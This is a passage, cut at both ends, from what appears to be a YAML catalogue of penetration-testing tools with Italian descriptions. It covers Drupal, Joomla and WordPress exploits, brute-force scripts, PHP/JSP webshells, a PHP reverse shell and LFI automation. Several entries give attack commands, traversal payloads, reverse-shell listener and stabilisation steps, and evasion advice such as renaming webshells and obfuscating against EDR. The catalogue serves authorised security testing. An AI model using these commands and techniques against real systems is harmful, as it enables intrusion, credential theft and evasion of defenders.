    rt-blue\">Funzioni chiave</h4><ul><li>Supporto a liste di target e wordlist user:pass.</li><li>Probe
    multiple per path e protocolli RTSP comuni.</li><li>Risultati esportabili per
    revisione manuale.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Strumento
    ad alto impatto: regolare thread/timeout, rispettare privacy e limiti legali.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtspscanner"
  name: "RTSPScanner"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["rtsp-scan", "path-testing", "api-output"]
  repo: "https://github.com/BeardedTek-com/RTSPScanner"
  desc: "Utility Python per enum sorgenti RTSP su host/network con path testing e
    API output per integration pipeline (rtsp-simple-server)"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSPScanner</strong>
    esegue scanning rete e probing endpoint RTSP (host/porte/URL) come CLI o classe
    Python. Usato in information gathering per inventariare stream e identificare
    host che espongono feed senza hardening. Output integrabile in pipeline automation
    e rtsp-simple-server.</p><h4 class=\"rt-purple\">Modalità utilizzo</h4><p><strong>CLI
    mode:</strong> Scan rapido da command line con output structured.</p><p><strong>Python
    class:</strong> Import in script custom per automation avanzata.</p><p><strong>API
    output:</strong> JSON/structured data per integration con dashboard/monitoring.</p><h4
    class=\"rt-green\">Funzionalità</h4><p><strong>Network scanning:</strong> Probe
    subnet o IP ranges per RTSP services.</p><p><strong>Port testing:</strong> Check
    porte comuni (554, 8554, 5554) e custom.</p><p><strong>URL validation:</strong>
    Test RTSP URLs per accessibility.</p><p><strong>Path enumeration:</strong> Basic
    route testing su endpoint discovered.</p><h4 class=\"rt-amber\">Best practice</h4><p>Definire
    scope chiaro per evitare scansioni fuori perimetro. Ridurre rumore con target
    lists mirate. Loggare risultati per tracking longitudinal. Validare stream rilevati
    manualmente con player. Integration con monitoring systems per alerting su nuovi
    stream unauthorized. Coordinare con network team per timing scansioni.</p><h4
    class=\"rt-red\">Note operative</h4><p>Tool oriented a inventory e monitoring
    vs. offensive testing. Combine con credential testing tools per assessment completo.
    Output structure facilita parsing automatico. Python class mode permette custom
    logic (filtering, notification, database storage). Rispettare privacy e regulations
    quando scanning video devices.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "drupalgeddon"
  name: "drupalgeddon"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["rce", "sql-injection", "cve-2014-3704"]
  repo: ""
  desc: "Exploit storico Drupal 7 (CVE-2014-3704) con SQLi in core per creazione admin
    o code execution, utile in legacy assessment"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon</strong>
    indica SQL injection critica corretta in SA-CORE-2014-005 che colpiva Drupal 7.
    In pentest web su versioni legacy è riferimento per indicatori compromissione,
    validation patch e procedure ripristino. In caso dubbio, ripristinare da backup
    antecedenti disclosure e rieseguire hardening con patch e WAF.</p><h4 class=\"\
    rt-purple\">CVE-2014-3704 details</h4><p><strong>Vulnerabilità:</strong> SQL injection
    in database abstraction layer permetteva:</p><ul><li>Creazione account admin arbitrari</li><li>Modifica
    contenuti database</li><li>Potential code execution via DB manipulation</li></ul></p><p><strong>Affected:</strong>
    Drupal 7.0 - 7.31</p><p><strong>Fixed:</strong> Drupal 7.32 (Ottobre 2014)</p><p><strong>Severity:</strong>
    Critical (CVSS 9.8)</p><h4 class=\"rt-green\">Exploitation timeline</h4><p><strong>SA-CORE-2014-005
    disclosure:</strong> 15 Ottobre 2014</p><p><strong>Public exploits:</strong> Entro
    7 ore dalla disclosure</p><p><strong>Mass exploitation:</strong> Iniziata immediatamente,
    siti compromessi in ore</p><p><strong>Presume breach:</strong> Ogni sito Drupal
    7.0-7.31 non patchato entro 7 ore da disclosure considerato compromesso</p><h4
    class=\"rt-amber\">Indicators of Compromise</h4><p>Se assessment su Drupal legacy
    pre-7.32:</p><ul><li>Account admin sospetti created after Oct 2014</li><li>Web
    shells in files/ directory</li><li>Modified core files</li><li>Backdoor modules
    in sites/all/modules/</li><li>Database triggers/stored procedures anomali</li></ul></p><h4
    class=\"rt-red\">Remediation</h4><p><strong>Se potenzialmente compromesso:</strong><br>1.
    Assume full compromise<br>2. Restore da backup pre-Oct 15, 2014<br>3. Update a
    Drupal 7.32+<br>4. Change all passwords<br>5. Audit per backdoors<br>6. Review
    access logs</p><p><strong>Prevention:</strong> Drupal 7.32+, WAF rules, regular
    patching, security monitoring. Testing drupalgeddon exploits solo in lab isolato
    con scope chiaro: exploitation produce permanent database changes.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Drupal"]
  notes:

- id: "drupalgeddon2"
  name: "drupalgeddon2"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["rce", "cve-2018-7600", "unauth"]
  repo: "https://github.com/dreadlocked/Drupalgeddon2"
  desc: "PoC CVE-2018-7600 (SA-CORE-2018-002) per injection Forms API che porta a
    RCE su Drupal 7/8 unpatched per initial access rapido"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon 2</strong>
    è PoC per CVE-2018-7600 (SA-CORE-2018-002): injection in Forms API porta a esecuzione
    comandi su Drupal 7/8 non patchati. Usato per initial access rapido su istanze
    legacy esposte. Strumento operativo per validare vulnerabilità in exploitation
    strettamente autorizzata per dimostrare rischio e priorità patching.</p><h4 class=\"\
    rt-purple\">CVE-2018-7600 technical details</h4><p><strong>Vulnerabilità:</strong>
    Remote Code Execution via improper input sanitization in Drupal Form API. Allows
    unauthenticated attacker inject malicious code processed server-side.</p><p><strong>Attack
    vector:</strong> POST request a vulnerable endpoint con payload crafted che bypassa
    validation e trigger code execution.</p><p><strong>Affected versions:</strong><ul><li>Drupal
    7.x before 7.58</li><li>Drupal 8.x before 8.3.9, 8.4.x before 8.4.6, 8.5.x before
    8.5.1</li></ul></p><p><strong>Severity:</strong> Critical - CVSS 9.8 (unauthenticated
    RCE)</p><h4 class=\"rt-green\">Exploitation workflow</h4><p><strong>1. Target
    identification:</strong> Fingerprint Drupal version via changelog, readme files
    o response headers.</p><p><strong>2. Exploit execution:</strong></p><pre><code>python
    drupalgeddon2.py -h https://target.com -c \"id\"</code></pre><p><strong>3. Command
    execution validation:</strong> Verificare output comando per conferma RCE.</p><p><strong>4.
    Evidence collection:</strong> Catturare screenshot, command output, request/response
    per reporting.</p><p><strong>5. Cleanup:</strong> Rimuovere artefatti lasciati
    da exploit se necessario.</p><h4 class=\"rt-amber\">Post-exploitation</h4><p>Dopo
    RCE validation, typical next steps:</p><ul><li>Web shell upload per persistent
    access</li><li>Database credentials extraction da settings.php</li><li>User enumeration
    e privilege escalation</li><li>Lateral movement se server multi-site</li></ul></p><h4
    class=\"rt-red\">Testing best practice</h4><p>Lavorare esclusivamente su staging
    environments. Catturare tutti log/evidenze per documentation. Ripristinare ambiente
    post-test a clean state. Informare immediatamente team difensivo di successful
    exploitation. Non eseguire comandi invasivi o data-altering durante validation.
    Coordinare timing test con change windows. Drupalgeddon2 produce side-effects
    rilevabili: monitor WAF/IDS logs. Remediation: immediate patching a versioni fixed,
    WAF virtual patching se update impossibile, review access logs per IOC exploitation
    attempts.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Drupal"]
  notes:

- id: "joomla-bruteforce"
  name: "joomla-bruteforce"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["auth-bruteforce", "session-handling", "proxy"]
  repo: "https://github.com/ajnik/joomla-bruteforce"
  desc: "Script per brute-force credenziali login Joomla con proxy support e session
    handling quando non esistono CVE note ma hardening debole"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Esegue tentativi autenticazione
    massivi verso login Joomla per validare igiene password. Si usa in credential
    testing su target consentiti, con liste mirate e throttle. Quando vulnerabilità
    note non disponibili ma sospetto di weak password policies, brute-force diventa
    viable assessment vector.</p><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Session
    management:</strong> Gestisce cookie sessione e CSRF token automaticamente.</p><p><strong>Proxy
    support:</strong> Routing via proxy per IP rotation o traffic analysis.</p><p><strong>Wordlist
    support:</strong> Username e password lists custom.</p><p><strong>Rate limiting:</strong>
    Throttling configurabile per rispettare lockout policy.</p><p><strong>Result logging:</strong>
    Valid credentials salvate automaticamente.</p><h4 class=\"rt-green\">Utilizzo
    tipico</h4><p><strong>Basic attack:</strong></p><pre><code>python joomla-bruteforce.py
    -u https://target.com/administrator -U users.txt -P passwords.txt</code></pre><p><strong>Con
    proxy:</strong></p><pre><code>joomla-bruteforce.py -u target -U users.txt -P passwords.txt
    --proxy http://127.0.0.1:8080</code></pre><p><strong>Delay tra attempts:</strong></p><pre><code>joomla-bruteforce.py
    -u target -U users.txt -P passwords.txt --delay 2</code></pre><p><strong>User-agent
    custom:</strong></p><pre><code>joomla-bruteforce.py -u target -U users.txt -P
    passwords.txt --user-agent \"Mozilla/5.0...\"</code></pre><h4 class=\"rt-amber\"\
    >Best practice</h4><p>Sempre rispettare lockout policy aziendali. Typical Joomla
    default: 10 failed attempts trigger temporary ban. Strategia: max 3-5 attempts
    per account, long delay (30+ seconds), rotate IP se possibile. Variare user-agent
    per evitare fingerprinting. Usare wordlist targeted: common passwords, company-specific
    terms, leaked credentials. Registrare solo tentativi autorizzati per compliance.
    Segnalare in report account con weak credentials identificati.</p><h4 class=\"\
    rt-red\">Considerazioni legali e tecniche</h4><p>Brute-force authentication genera
    eventi security rilevabili: 4625 equivalent in Joomla logs, potential SIEM alerts,
    possibile account lockout per utenti legittimi. Coordinare con client per timing
    (fuori orario lavorativo) e scope (test accounts vs production). Script basic
    può non gestire anti-automation measures moderne (rate limiting applicativo, challenge-response,
    behavioral analysis). Alternative: se credential stuffing viable, usare leaked
    databases invece brute-force blind. Se password policies strong, brute-force ineffective:
    focus su other vectors.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Joomla"]
  notes:

- id: "joomla-dir-traversal"
  name: "joomla_dir_trav.py"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["path-traversal", "file-read", "artifact-extract"]
  repo: ""
  desc: "Exploit per directory traversal Joomla che consente lettura/cancellazione
    file fuori path previsto per exfiltration config/log"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Raccoglie tecniche e PoC per
    validare 'path traversal' in core/plugin Joomla su release legacy: varianti su
    estrazione archivi e download di file. Si usa in 'vulnerability validation' per
    ricostruire impatti (lettura file sensibili) e confermare patch effectiveness.
    Directory traversal permette attacker leggere file arbitrari server-side: configuration.php,
    access logs, backup files.</p><h4 class=\"rt-purple\">Vulnerability patterns</h4><p><strong>File
    download vulnerabilities:</strong> Component che permettono download file senza
    proper path sanitization. Pattern comune: <code>index.php?option=com_component&task=download&file=../../configuration.php</code></p><p><strong>Archive
    extraction:</strong> Upload/extract functionality che non valida path dentro archive.
    Attacker craft ZIP con path traversal: <code>../../shell.php</code></p><p><strong>Image/media
    handling:</strong> Media manager vulnerabilities allowing traversal via crafted
    filenames.</p><h4 class=\"rt-green\">Common target files</h4><p><strong>configuration.php:</strong>
    Database credentials, secret keys, site configuration.</p><p><strong>Access logs:</strong>
    /var/log/apache2/access.log, session tokens, user activity.</p><p><strong>Backup
    files:</strong> .sql dumps, configuration backups in tmp/.</p><p><strong>/etc/passwd:</strong>
    System users enumeration (se permissions permettono).</p><h4 class=\"rt-amber\"\
    >Testing workflow</h4><p><strong>1. Vulnerability identification:</strong> Identify
    component/plugin con file operations.</p><p><strong>2. Path traversal test:</strong>
    Submit requests con ../../../ sequences.</p><p><strong>3. Encoding bypass:</strong>
    Test URL encoding, double encoding, Unicode variations se direct traversal blocked.</p><p><strong>4.
    Impact validation:</strong> Attempt read configuration.php per confirm.</p><p><strong>5.
    Documentation:</strong> Capture exact request/response per PoC.</p><h4 class=\"\
    rt-red\">Remediation validation</h4><p>Lavorare esclusivamente su staging copy,
    non production. Non exfiltrare dati sensibili oltre proof necessario. Documentare
    endpoint/parametri/path specifici. Verificare patch effectiveness con same vectors
    post-remediation. Coordinate con development team per comprehensive fix validation.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "Joomla"]
  notes:

- id: "wp-cve-2024-9047"
  name: "CVE-2024-9047"
  version: "2024-9047"
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["path-traversal", "arbitrary-read", "wp-file-upload"]
  repo: ""
  desc: "PoC/notes per CVE‑2024‑9047 (WordPress File Upload): path traversal e file
    read non autenticato (<=4.24.11)."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Materiale operativo per testare
    CVE‑2024‑9047 nel plugin WordPress File Upload, che consente path traversal e
    lettura/eliminazione di file fuori directory in installazioni con PHP 7.4 o antecedente.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Esempi di richieste e indicatori
    di vulnerabilità.</li><li>Note su versioni affette e prerequisiti (PHP <=7.4).</li><li>Rimedi
    e riferimenti a patch/aggiornamenti.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Testare
    in staging o con autorizzazione scritta. Applicare update del plugin oltre 4.24.11
    e limitare accessi.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
  notes:

- id: "wp-wpdiscuz-rce"
  name: "RCE - wpDiscuz"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["unauth-file-upload", "rce", "cve-2020-24186"]
  repo: "https://www.exploit-db.com/exploits/49967"
  desc: "Exploit RCE non autenticato per wpDiscuz (<=7.0.4, CVE‑2020‑24186): upload
    arbitrario e code execution."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PoC per la vulnerabilità critica
    in wpDiscuz che permette l’upload di file arbitrari via endpoint AJAX, conducendo
    a RCE su siti affetti. Include indicazioni di sfruttamento e riferimenti.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Costruzione della richiesta di upload
    e trigger della shell.</li><li>Verifica delle versioni vulnerabili (7.0–7.0.4).</li><li>Note
    di mitigazione e detection nei log.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Limitare
    l’uso a asset autorizzati; aggiornare il plugin e rimuovere artefatti post test.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
  notes:

- id: "wpxploit-1-0-0"
  name: "wpxploit"
  version: "1.0.0"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["xmlrpc-bruteforce", "credential-spraying"]
  repo: "https://github.com/relarizky/wpxploit"
  desc: "Script per XML‑RPC dictionary attack contro WordPress: login bruteforce e
    validazione credenziali."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXploit automatizza attacchi
    di dizionario all’endpoint XML‑RPC di WordPress per individuare account deboli,
    con gestione wordlist e report degli hit validi.</p><h4 class=\"rt-blue\">Funzioni
    chiave</h4><ul><li>Supporto a liste utenti/password, proxy e timeout.</li><li>Parsing
    delle risposte XML‑RPC per false‑positive ridotte.</li><li>CLI semplice, output
    pulito per follow‑up.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Rispettare
    rate‑limit e policy; preferire account canary e window autorizzate dal cliente.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
  notes:

- id: "wpxstrike"
  name: "WPXStrike"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["xss-to-rce", "wp-automation", "post-exploitation"]
  repo: "https://github.com/nowak0x01/WPXStrike"
  desc: "Script che eleva XSS a RCE su WordPress sfruttando chain note (plugin/theme)
    per esecuzione di codice."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXStrike automatizza catene
    di sfruttamento post‑XSS su WordPress (iniezione admin, plugin editor, webshell),
    con supporto alle versioni 4.x–6.x e flussi guidati.</p><h4 class=\"rt-blue\"\
    >Funzioni chiave</h4><ul><li>Payload XSS e step per escalation fino a RCE.</li><li>Compatibilità
    con molte versioni WordPress.</li><li>Esempi e template per casi pratici.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Usare su istanze di prova; rimuovere utenti/artefatti
    creati. Coordinarsi con Blue per detection use‑cases.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
  notes:

- id: "phpbash"
  name: "phpbash"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "webshell"
  phases: ["02_Exploitation"]
  caps: ["semi-interactive-shell", "tty-like", "exec"]
  repo: "https://github.com/Arrexel/phpbash"
  desc: "Web-shell PHP semi-interattiva con interfaccia tipo TTY per eseguire comandi,
    navigare filesystem e trasferire file post-upload"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>phpbash</strong> è web-shell
    PHP minimalista single-file con interfaccia semi-interattiva per post-exploitation
    controllata. Fornisce navigazione file, esecuzione comandi e semplicità deploy
    quando accesso web già compromesso. Design minimale riduce footprint e facilita
    rapid deployment dopo successful file upload vulnerability exploitation.</p><h4
    class=\"rt-purple\">Funzionalità</h4><p><strong>Terminal-like interface:</strong>
    Browser-based shell che emula esperienza command-line con history e output formatting.</p><p><strong>File
    navigation:</strong> Cambio directory, listing files, viewing content direttamente
    da interface.</p><p><strong>Command execution:</strong> Esecuzione comandi shell
    con output capture e display formatted.</p><p><strong>Single file:</strong> Tutto
    contenuto in phpbash.php, no dependencies, rapid deployment.</p><h4 class=\"rt-green\"\
    >Deployment workflow</h4><p><strong>1. Upload:</strong> Dopo identificazione file
    upload vulnerability, upload phpbash.php rinominato per evasion (es. image.php.jpg
    con double extension o config.php per mimetizzazione).</p><p><strong>2. Access:</strong>
    Navigate a uploaded file location via browser: https://target.com/uploads/phpbash.php</p><p><strong>3.
    Interaction:</strong> Use terminal interface per execute commands, navigate filesystem,
    gather intelligence.</p><p><strong>4. Persistence (optional):</strong> Se richiesto
    persistence, use phpbash per download/execute additional tools o create scheduled
    tasks.</p><h4 class=\"rt-amber\">Utilizzo tipico</h4><p><strong>Information gathering:</strong>
    Execute enumeration commands (id, uname, ps, netstat) per situational awareness.</p><p><strong>Credential
    hunting:</strong> Search configuration files, environment variables, history files
    per credentials.</p><p><strong>Privilege escalation prep:</strong> Upload LinEnum,
    pspy, privilege escalation scripts via wget/curl commands.</p><p><strong>Lateral
    movement:</strong> Scan internal network, pivot to other systems, establish tunnels.</p><h4
    class=\"rt-red\">OPSEC considerations</h4><p>Limitare uso di phpbash a minimal
    necessary time. Web-shell PHP è signature comune per AV/EDR: rinominare variabili,
    obfuscare code se defensive measures presenti. Dopo usage, rimuovere file immediatamente
    per ridurre forensics artifacts. Documentare tutte azioni eseguite tramite shell
    per reporting e rollback capability. Access logs registrano ogni request a phpbash.php:
    coordinate timing con authorized testing windows. Phpbash fornisce convenienza
    ma è easily detectable: consider reverse shell o C2 framework per operations prolungate.
    In pentesting autorizzato, phpbash è rapid evidence collection tool, non production
    persistence mechanism.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "File_Upload"]
  notes:

- id: "php-reverse-shell"
  name: "php-reverse-shell"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "webshell"
  phases: ["02_Exploitation"]
  caps: ["reverse-connection", "callback", "simple"]
  repo: "https://github.com/pentestmonkey/php-reverse-shell"
  desc: "Script PHP minimale per reverse shell verso listener controllato, veloce
    da configurare con solo IP/porta per callback post-upload"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Script classico pentest che
    apre reverse shell da target verso listener controllato. Usato dopo ottenimento
    file upload o LFI-to-RCE. Design minimale richiede solo modifica IP e porta nel
    source code, poi upload ed execution per establish interactive shell connection.</p><h4
    class=\"rt-purple\">Meccanica reverse shell</h4><p><strong>Listener setup:</strong>
    Attacker avvia listener su propria macchina (netcat, socat, metasploit handler)
    su porta specifica.</p><p><strong>Payload modification:</strong> Edit php-reverse-shell.php
    modificando variables: $ip (attacker IP) e $port (listener port).</p><p><strong>Upload
    & trigger:</strong> Upload script via vulnerability e trigger execution (direct
    access, LFI inclusion, cron job).</p><p><strong>Connection establishment:</strong>
    Script PHP apre socket connection verso attacker listener, redirecting stdin/stdout/stderr
    per interactive shell.</p><h4 class=\"rt-green\">Setup completo</h4><p><strong>1.
    Listener preparation:</strong></p><pre><code>nc -lvnp 4444</code> (netcat listener
    su porta 4444)</p><p><strong>2. Script customization:</strong><br>Edit php-reverse-shell.php:<br><code>$ip
    = '10.10.14.5';  // Your IP<br>$port = 4444;         // Your port</code></pre><p><strong>3.
    Upload via vulnerability:</strong> Use file upload bug, webshell, o altro vector
    per place script su target.</p><p><strong>4. Trigger execution:</strong> Access
    script via HTTP: <code>curl https://target.com/uploads/shell.php</code></p><p><strong>5.
    Interactive shell:</strong> Connection established, comandi eseguibili interactively
    su listener.</p><h4 class=\"rt-amber\">Shell stabilization</h4><p>Dopo initial
    connection, stabilize shell per better usability:<br><code>python -c 'import pty;
    pty.spawn(\"/bin/bash\")'</code> (spawn PTY)<br><code>export TERM=xterm</code>
    (set terminal type)<br><code>stty raw -echo; fg</code> (enable raw mode on attacker
    side)</p><p>Stabilized shell supporta tab completion, arrow keys, command history,
    clear screen.</p><h4 class=\"rt-red\">Considerazioni operative</h4><p>Definire
    IP/porta dedicati per engagement: evitare confusion con altre operations. Usare
    listener isolati (tmux/screen session) per persistence se connection drops. Limitare
    permessi script: dopo execution, shell eredita permessi web server user (www-data,
    apache) quindi privilege escalation spesso necessaria. Rimuovere artefatto post-engagement:
    delete php file e review access logs per cleanup. Evitare ambienti production
    senza finestra change: reverse shell può impattare server performance se mal gestita.
    Firewall outbound può bloccare connection: test connectivity prima o use alternative
    ports (80, 443, 53). Alternative moderne: meterpreter payloads, C2 frameworks
    offrono più features ma php-reverse-shell rimane simple, reliable, widely compatible
    classic per quick access.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "File_Upload"]
  notes:

- id: "tomcat-cmd-jsp"
  name: "Tomcat_cmd.jsp"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "webshell"
  phases: ["02_Exploitation"]
  caps: ["jsp-shell", "tomcat-manage", "cmd-exec"]
  repo: "https://github.com/SecurityRiskAdvisors/cmd.jsp"
  desc: "Web-shell JSP universale per Tomcat/Java con command execution e file management
    basic, utile dove filtri PHP non applicabili"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Single file JSP che esegue comandi
    sistema e offre upload basico. Usato in post-exploitation su Tomcat quando exploit
    consente write nel webroot. JSP (JavaServer Pages) è server-side technology per
    Java application servers, permettendo embedding Java code in HTML pages per dynamic
    content generation. Tomcat_cmd.jsp fornisce web-based interface per remote command
    execution su Java environments.</p><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Command
    execution:</strong> Execute arbitrary system commands via Runtime.getRuntime().exec()
    Java API.</p><p><strong>Output capture:</strong> Command output catturato e displayed
    in browser interface.</p><p><strong>File management:</strong> Basic file operations
    (upload, download, delete) se implementate in variant.</p><p><strong>Cross-platform:</strong>
    Funziona su Windows e Linux Tomcat installations.</p><h4 class=\"rt-green\">Deployment
    scenario</h4><p><strong>Tomcat vulnerabilities conducenti a file write:</strong><ul><li>CVE-2017-12617
    (PUT method RCE)</li><li>Tomcat Manager weak credentials con WAR upload</li><li>Path
    traversal in web applications deployed</li><li>Unrestricted file upload in hosted
    applications</li></ul></p><p><strong>Workflow tipico:</strong><br><strong>1. Exploit
    vulnerability:</strong> Use Tomcat manager credentials, PUT upload, o application
    vulnerability per place cmd.jsp in webapps/ROOT/ o altro accessible path.<br><strong>2.
    Access shell:</strong> Browse to https://target.com/cmd.jsp<br><strong>3. Command
    execution:</strong> Enter commands in web form, view output.<br><strong>4. Post-exploitation:</strong>
    Use shell per enumeration, privilege escalation, lateral movement.</p><h4 class=\"\
    rt-amber\">Java-specific considerations</h4><p><strong>Process execution quirks:</strong>
    Java Runtime.exec() ha behavior differences vs native shells. Command con pipes,
    redirects, shell variables non funzionano direttamente. Workaround: execute bash/cmd.exe
    con -c flag: <code>bash -c \"command | grep pattern\"</code></p><p><strong>Character
    encoding:</strong> JSP default encoding può causare issues con output non-ASCII.
    Ensure proper charset configuration.</p><p><strong>Permissions:</strong> Shell
    eseguita con user Tomcat process (spesso tomcat, tomcat8), not root. Privilege
    escalation necessaria per full system control.</p><h4 class=\"rt-red\">OPSEC e
    cleanup</h4><p>Cambiare nome/percorso JSP per reduce visibility: invece cmd.jsp,
    use innocuous name come error.jsp, config.jsp. Dopo uso, rimuovere file immediatamente:
    <code>rm /path/to/webapps/ROOT/shell.jsp</code> via stesso webshell. Limitare
    esposizione temporale: deploy, use, delete in narrow timeframe. Regole temporanee
    firewall possono limitare access a webshell solo da attacker IP. Coordinamento
    con team blu essenziale: Tomcat webshells sono high-severity findings, immediate
    notification richiesta post-discovery. Alternative: se Tomcat Manager accessible,
    deploy WAR con backdoor è method più sofisticato con cleanup più controllato (undeploy
    application vs file system manipulation).</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "File_Upload"]
  notes:

- id: "wwwolf-php-webshell"
  name: "wwwolf-php-webshell"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "webshell"
  phases: ["02_Exploitation"]
  caps: ["file-manager", "cmd-exec", "upload-download"]
  repo: "https://github.com/WhiteWinterWolf/wwwolf-php-webshell"
  desc: "Web-shell PHP completa con file manager, command execution e network functions
    per operazioni rapide post-upload e payload staging"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Shell PHP feature-rich per gestione
    file e comandi che facilita triage in post-exploitation. Include file manager
    GUI, command executor, network utilities, database client, e più. Designed per
    rapid operations quando interactive access a compromised server necessario. Da
    usare con cautela in ambienti segregati o staging per extensive feature set visibility
    concerns.</p><h4 class=\"rt-purple\">Feature set completo</h4><p><strong>File
    Manager:</strong> Browse filesystem con GUI, upload/download files, edit text
    files, change permissions, create directories, compress/extract archives.</p><p><strong>Command
    Execution:</strong> Multiple execution methods (shell_exec, system, passthru,
    exec) con output formatting e history.</p><p><strong>Database Client:</strong>
    Connect MySQL, PostgreSQL, SQLite per query execution e data exfiltration.</p><p><strong>Network
    Tools:</strong> Port scanner, reverse shell generator, bind shell, back connect
    utilities.</p><p><strong>System Information:</strong> PHP info, server configuration,
    environment variables, loaded modules display.</p><p><strong>Process Management:</strong>
    View running processes, kill processes se permissions permettono.</p><h4 class=\"\
    rt-green\">Utilizzo post-compromise</h4><p><strong>Rapid enumeration:</strong>
    Use system info tab per gather PHP configuration, extensions available, disable_functions
    status.</p><p><strong>Credential hunting:</strong> File manager search functionality
    per locate configuration files (config.php, .env, database.yml).</p><p><strong>Data
    exfiltration:</strong> Database client per dump sensitive data, file manager per
    download archives.</p><p><strong>Privilege escalation staging:</strong> Upload
    privilege escalation scripts, exploits, enumeration tools via file manager.</p><p><strong>Lateral
    movement:</strong> Network scanner per discover internal hosts, reverse shell
    generator per pivot to other systems.</p><h4 class=\"rt-amber\">Security through
    obscurity</h4><p><strong>Protezione con secret:</strong> wwwolf-php-webshell supporta
    password protection. Configure strong temporary password pre-upload per prevent
    unauthorized access se URL discovered.</p><p><strong>Rename strategically:</strong>
    Non usare obvious names (shell.php, webshell.php). Use nomi che blend con application:
    admin_config.php, includes/cache.php, media/thumb.php.</p><p><strong>Logging actions:</strong>
    Webshell dovrebbe avere internal logging di azioni eseguite per audit trail e
    reporting. Document ogni operation per rollback capability.</p><h4 class=\"rt-red\"\
    >Gestione responsabile</h4><p>Feature-rich webshells sono double-edged sword:
    powerful per pentester ma extremely visible per defenders. Best practice: proteggere
    con password, limitare diffusione URL, monitorare access logs, rimuovere immediatamente
    post-operations. Coordinare con team blue: webshell presence è critical finding
    requiring immediate attention. Log file contiene potenzialmente sensitive actions/data:
    protect appropriately e include in final reporting con redaction di credentials
    actual. Alternative moderne: C2 frameworks (Metasploit, Cobalt Strike, Sliver)
    offrono equivalent functionality con better OPSEC, encryption, e command/control
    separation. Wwwolf-php-webshell rimane valido per quick operations, lab environments,
    o scenarios dove C2 infrastructure impractical, ma production engagements dovrebbero
    favor purpose-built tools con security considerations.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "File_Upload"]
  notes:

- id: "lfifreak"
  name: "LFiFreak"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["lfi-auto", "wrapper-bypass", "wordlist"]
  repo: "https://github.com/OsandaMalith/LFiFreak"
  desc: "Tool automazione LFI con test wrapper (php://, data://), bypass comuni e
    wordlist percorsi per escalation da file-read a code-exec"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>LFiFreak automatizza verifiche
    e sfruttamento Local File Inclusion, proponendo payload e, dove possibile, pivot
    verso esecuzione comandi. Usato in web exploitation dopo rilevamento LFI per quantificare
    impatto reale. Tool testa wrapper PHP streams, encoding bypasses, e tecniche escalation
    (log poisoning, session hijack) per transform read-only LFI in RCE.</p><h4 class=\"\
    rt-purple\">LFI exploitation techniques</h4><p><strong>Direct file inclusion:</strong>
    Basic traversal con ../../../etc/passwd per validate vulnerability.</p><p><strong>PHP
    wrappers:</strong><ul><li><code>php://filter/convert.base64-encode/resource=</code>
    per extract PHP source code</li><li><code>php://input</code> per inject PHP code
